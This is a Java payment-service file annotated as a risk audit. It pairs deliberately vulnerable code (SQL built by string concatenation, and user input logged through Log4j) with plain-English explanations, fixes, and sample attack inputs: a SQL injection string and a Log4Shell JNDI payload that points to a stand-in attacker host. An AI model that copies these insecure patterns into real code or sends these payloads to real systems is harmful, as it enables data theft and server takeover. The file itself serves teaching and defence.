package com.ecommerce.service;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * ============================================================================
 * REPOSITORY RISK AUDIT: PaymentService.java
 * ============================================================================
 * 
 * WHAT THIS FILE DOES:
 * This file handles customer payments in an online store. It checks if customer
 * bank accounts exist and calculates transaction fees during checkout.
 * 
 * WHY THIS FILE IS DANGEROUS TO THE PROJECT (EXECUTIVE SUMMARY):
 * Even though this file is only 60 lines long, it contains 3 CRITICAL risks
 * that can lead to stolen customer money, a total server takeover by hackers,
 * or sudden store crashes during peak sales:
 * 
 * 1. DATA THEFT (SQL Injection):
 *    Hackers can steal every customer's banking and personal information.
 * 
 * 2. SERVER TAKEOVER (Log4Shell / Remote Code Execution):
 *    Attackers can run malicious commands on our server and install ransomware.
 * 
 * 3. STORE CRASHES (Spaghetti / Complex Logic):
 *    The fee calculation is so messy (18 tangled rules) that making any change
 *    risks breaking checkout and overcharging customers.
 * ============================================================================
 */
public class PaymentService {
    private static final Logger logger = LogManager.getLogger(PaymentService.class);

    /**
     * RISK 1: CUSTOMER DATA THEFT VIA SQL INJECTION (CWE-89)
     * 
     * [What this method does]:
     * Looks up an account in our database using the account ID typed by the user.
     * 
     * [The Risk in Plain English]:
     * Instead of safely packaging the user's input, the code glues whatever
     * the user typed directly into the database query command with "+ accountId +".
     * 
     * [How an attacker abuses this]:
     * An attacker enters:  ' OR '1'='1
     * The database gets tricked into returning EVERY customer account in the system,
     * including private banking details, passwords, and order histories.
     * 
     * [Business Impact]:
     * Massive data breach, heavy regulatory fines (GDPR, PCI-DSS compliance failure),
     * and devastating loss of customer trust.
     * 
     * [The Easy Fix]:
     * Use a "PreparedStatement" with parameter placeholders (?) so user input
     * is treated strictly as plain text, never as executable database commands.
     */
    public boolean verifyAccountHolder(String accountId, Connection connection) throws SQLException {
        // DANGER: Raw text concatenation glues user input directly into SQL command
        String sql = "SELECT * FROM payment_accounts WHERE account_id = '" + accountId + "'";
        Statement stmt = connection.createStatement();
        ResultSet rs = stmt.executeQuery(sql);

        /**
         * RISK 2: REMOTE SERVER TAKEOVER VIA LOG4SHELL (CVE-2021-44228)
         * 
         * [The Risk in Plain English]:
         * The code writes the user's raw input directly to the system log.
         * Because this project uses an outdated Log4j library (v2.14.1),
         * Log4j will automatically execute hidden instructions inside the log text.
         * 
         * [How an attacker abuses this]:
         * If the attacker enters:  ${jndi:ldap://evil-hacker.com/malware}
         * Our server connects to the hacker's computer, downloads their malware,
         * and runs it with full administrative permissions.
         * 
         * [Business Impact]:
         * The attacker can lock the entire company database for ransom,
         * delete all records, or use our company servers for illegal activity.
         * 
         * [The Easy Fix]:
         * Update the pom.xml library to Log4j 2.17.1 or higher immediately.
         */
        logger.info("Account verification queried for identifier: " + accountId);

        return rs.next();
    }

    /**
     * RISK 3: UNSTABLE & FRAGILE BUSINESS LOGIC (High Cyclomatic Complexity)
     * 
     * [What this method does]:
     * Calculates the processing fee for a transaction based on amount,
     * customer tier, foreign currency, promotions, and risk score.
     * 
     * [The Risk in Plain English]:
     * There are 18 deeply nested "if-else" conditions tangled into one block.
     * It is practically impossible for any developer to test all 18 combinations.
     * 
     * [Business Impact]:
     * - Every time marketing changes a promo or tier fee, developers accidentally
     *   break another customer's calculation, causing overbilling or underbilling.
     * - When checkout gets busy, subtle edge-case errors cause transactions to fail,
     *   costing the business thousands of dollars in lost cart checkouts.
     * - Increases development costs because fixing one bug creates two new ones.
     * 
     * [The Easy Fix]:
     * Break this into small, independent pricing strategies (Rule 1: International fee,
     * Rule 2: Tier discount, Rule 3: Promo discount) so each rule is tested on its own.
     */
    public int calculateTransactionFee(double amount, int tier, boolean isForeign, boolean isPromo, int riskIndex) {
        int fee = 0;
        if (amount > 10000) {
            if (isForeign) {
                if (tier == 1) fee += 50;
                else if (tier == 2) fee += 40;
                else fee += 30;
            } else {
                if (isPromo) fee += 10;
                else fee += 20;
            }
        } else if (amount > 1000) {
            if (riskIndex > 70) {
                if (tier == 3) fee += 25;
                else fee += 15;
            } else {
                fee += 5;
            }
        } else {
            if (isPromo) fee = 0;
            else fee = 2;
        }

        if (riskIndex > 90) fee += 100;
        return fee;
    }
}
